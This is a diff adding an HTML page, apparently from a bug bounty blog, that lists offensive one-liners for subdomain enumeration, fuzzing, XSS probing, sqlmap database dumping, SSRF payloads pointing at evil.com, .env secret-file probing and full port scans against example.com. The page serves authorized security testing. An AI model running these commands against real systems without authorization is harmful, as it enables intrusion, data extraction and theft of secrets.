@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Bounty One-Liners</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+    <div class="container mx-auto px-4 py-8">
+        <h1 class="text-4xl font-bold text-center text-blue-400">Bug Bounty One-Liners</h1>
+        <p class="text-center text-gray-300 mt-2">Powerful bug bounty scripts for reconnaissance, fuzzing, and exploitation.</p>
+        
+        <div class="mt-8 space-y-6">
+            <div class="bg-gray-800 p-4 rounded-lg shadow">
+                <h2 class="text-xl font-semibold text-green-400">Subdomain Enumeration</h2>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">subfinder -d example.com -silent | tee subdomains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">assetfinder --subs-only example.com | tee subdomains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">amass enum -passive -d example.com -o subdomains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">curl -s https://crt.sh/?q=%.example.com&output=json | jq -r '.[].name_value' | sed 's/\\n/\\n/g' | sort -u</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">findomain -t example.com -u subdomains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">chaos -d example.com -key YOUR_CHAOS_API_KEY | tee subdomains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">curl -s https://api.certspotter.com/v1/issuances\?domain\=example.com\&include_subdomains\=true\&expand\=dns_names | jq -r '.[].dns_names[]' | sort -u</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat subdomains.txt | httpx -silent -o live_subdomains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">shuffledns -d example.com -list wordlist.txt -r resolvers.txt -o subdomains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat subdomains.txt | hakrawler -depth 2 -plain | tee urls.txt</pre>
+            </div>
+
+            <div class="bg-gray-800 p-4 rounded-lg shadow">
+                <h2 class="text-xl font-semibold text-yellow-400">Directory & File Fuzzing</h2>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,302</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gobuster dir -u https://example.com -w wordlist.txt -x php,txt,html -o results.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">dirsearch -u https://example.com -e php,txt,html -t 50</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">feroxbuster -u https://example.com -w wordlist.txt -t 50</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">waybackurls example.com | grep -E '\.php|\.aspx|\.jsp' | tee wayback_files.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">katana -u https://example.com -d 5 -jc -kf robots.txt,sitemap.xml | tee crawl_results.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">curl -sL https://example.com/robots.txt | tee robots.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">python3 paramspider.py --domain example.com</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gau example.com | sort -u | tee all_urls.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">katana -u https://example.com -d 2 | httpx -mc 200 -o valid_urls.txt</pre>
+            </div>
+
+            <div class="bg-gray-800 p-4 rounded-lg shadow">
+                <h2 class="text-xl font-semibold text-red-400">Parameter Discovery & XSS Hunting</h2>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">waybackurls example.com | grep "=" | tee params.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat urls.txt | gf xss | tee xss_params.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">dalfox file xss_params.txt -b YOUR_BURPCOLLABORATOR_SERVER</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">katana -u https://example.com -jc -o js_files.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat js_files.txt | subjs | tee js_endpoints.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gf xss js_endpoints.txt | tee potential_xss.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat js_endpoints.txt | nuclei -t xss-detect.yaml -o xss_results.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">echo 'alert(1)' | qsreplace FUZZ | xargs -I % curl -s -X GET "https://example.com?query=%" | grep -q 'alert(1)' && echo 'Potential XSS Found!'</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">kxss -i urls.txt -o xss_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat urls.txt | xssstrike</pre>
+            </div>
+            <div class="bg-gray-800 p-3 rounded text-sm overflow-auto">
+                <h2 class="text-xl font-semibold text-blue-400">API & GraphQL Testing</h2>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gospider -s https://example.com/api -c 10 -d 2 | tee api_urls.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat api_urls.txt | nuclei -t cves/ -o cve_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat api_urls.txt | nuclei -t technologies/ -o tech_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gospider -s https://example.com/graphql -c 10 -d 2 | tee graphql_urls.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat graphql_urls.txt | nuclei -t cves/ -o cve_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat graphql_urls.txt | nuclei -t technologies/ -o tech_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gospider -s https://example.com/api -c 10 -d 2 | kxss -o xss_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gospider -s https://example.com/graphql -c 10 -d 2 | kxss -o xss_findings.txt</pre>
+            </div>
+            <!-- <div class="bg-gray-800 p-3 rounded text-sm overflow-auto"></div>
+            <h2 class="text-xl font-semibold text-green-400">Cloud & Server Testing</h2>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli s3 ls s3://example-bucket</pre>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli ec2 describe-instances</pre>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli rds describe-db-instances</pre>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli ssm get-parameters-by-path --path</pre>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli lambda list-functions</pre>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli cloudfront list-distributions</pre>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli route53 list-hosted-zones</pre>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">awscli iam list-users</pre>
+            </div> -->
+            <div class="bg-gray-800 p-3 rounded text-sm overflow-auto">
+                <h2 class="text-xl font-semibold text-blue-400">SQL Injection & SSRF Testing</h2>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">sqlmap -u "https://example.com/index.php?id=1" --batch --dbs</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat urls.txt | gf sqli | tee sqli_params.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">sqlmap -m sqli_params.txt --risk=3 --level=5 --batch</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">ffuf -u "https://example.com/page.php?id=FUZZ" -w sql_payloads.txt -mc 200</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat urls.txt | gf ssrf | tee ssrf_params.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">echo 'http://evil.com' | qsreplace FUZZ | xargs -I % curl -s -X GET "https://example.com?url=%"</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">nuclei -u example.com -t ssrf-detect.yaml -o ssrf_results.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">httpx -u https://example.com -silent -mc 200,403 -path '/.env'</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">curl -s -X POST -d 'param=http://evil.com' https://example.com/ssrf.php</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">gf ssrf urls.txt | tee ssrf_findings.txt</pre>
+            </div>
+
+            <div class="bg-gray-800 p-4 rounded-lg shadow">
+                <h2 class="text-xl font-semibold text-purple-400">Miscellaneous Commands</h2>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">dnsx -l subdomains.txt -o resolved_domains.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">naabu -list resolved_domains.txt -p - -o open_ports.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">masscan -p1-65535 --rate 1000 -iL resolved_domains.txt -oG masscan_results.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat open_ports.txt | httpx -silent -title -tech-detect -o tech_stack.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">nmap -iL resolved_domains.txt -p- --script=http-title,http-headers -oN nmap_scan.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">nuclei -l live_subdomains.txt -t cves/ -o cve_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat live_subdomains.txt | nuclei -t technologies/ -o tech_findings.txt</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat open_ports.txt | grep '3306' && echo 'MySQL Port Open - Potential Exploit!'</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">cat live_subdomains.txt | xargs -I % curl -s -k "%" | grep -i 'admin'</pre>
+                <pre class="bg-gray-700 p-3 rounded text-sm overflow-auto">wpscan --url https://example.com --enumerate vp,vt,u --api-token YOUR_API_KEY</pre>
+            </div>
+        </div>
+
+        <footer class="text-center text-gray-400 mt-8">&copy; 2025 Bug Bounty Blog | Happy Hunting!</footer>
+    </div>
+</body>
+</html>
